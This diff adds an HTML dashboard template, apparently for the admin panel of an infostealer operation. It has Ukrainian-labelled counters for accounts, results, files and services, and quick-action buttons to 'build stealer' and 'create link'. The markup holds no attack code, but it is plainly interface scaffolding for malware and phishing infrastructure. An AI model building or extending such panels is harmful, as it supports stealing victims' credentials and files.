@@ -1,0 +1,96 @@
+{% extends "admin/base.html" %}
+
+{% block title %}Dashboard - {{ app_name }}{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
+    <h1 class="h2">Dashboard</h1>
+</div>
+
+<div class="row">
+    <div class="col-md-3 mb-4">
+        <div class="card text-white bg-primary">
+            <div class="card-body">
+                <div class="d-flex">
+                    <div>
+                        <h4 class="card-title">0</h4>
+                        <p class="card-text">Акаунтів</p>
+                    </div>
+                    <div class="ms-auto">
+                        <i class="fas fa-users fa-2x"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-3 mb-4">
+        <div class="card text-white bg-success">
+            <div class="card-body">
+                <div class="d-flex">
+                    <div>
+                        <h4 class="card-title">0</h4>
+                        <p class="card-text">Результатів</p>
+                    </div>
+                    <div class="ms-auto">
+                        <i class="fas fa-chart-line fa-2x"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-3 mb-4">
+        <div class="card text-white bg-warning">
+            <div class="card-body">
+                <div class="d-flex">
+                    <div>
+                        <h4 class="card-title">0</h4>
+                        <p class="card-text">Файлів</p>
+                    </div>
+                    <div class="ms-auto">
+                        <i class="fas fa-file fa-2x"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-3 mb-4">
+        <div class="card text-white bg-info">
+            <div class="card-body">
+                <div class="d-flex">
+                    <div>
+                        <h4 class="card-title">5</h4>
+                        <p class="card-text">Сервісів</p>
+                    </div>
+                    <div class="ms-auto">
+                        <i class="fas fa-cogs fa-2x"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>Швидкі дії</h5>
+            </div>
+            <div class="card-body">
+                <a href="/admin/devices" class="btn btn-primary me-2">
+                    <i class="fas fa-plus"></i> Додати акаунт
+                </a>
+                <a href="/admin/stealer" class="btn btn-success me-2">
+                    <i class="fas fa-download"></i> Збудувати стіллер
+                </a>
+                <a href="/admin/services" class="btn btn-info">
+                    <i class="fas fa-link"></i> Створити посилання
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
